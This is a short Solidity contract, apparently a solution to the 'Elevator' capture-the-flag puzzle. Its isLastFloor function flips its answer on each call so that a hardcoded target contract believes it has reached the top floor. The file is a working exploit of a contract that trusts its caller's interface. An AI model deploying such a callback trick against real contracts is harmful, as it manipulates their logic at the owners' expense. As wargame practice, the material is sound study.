// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Builiding {
    function isLastFloor(uint) external returns (bool);
}

interface Target {
    function goTo(uint256) external;
}

contract ElevatorAttack {
    Target target = Target(0xBE3F69A06C094015f2641fFe8EF8241484c421fe);
    bool res = true;

    function attack() external {
        target.goTo(1);
    }

    function isLastFloor(uint) external returns (bool) {
        res = !res;
        return res;
    }
}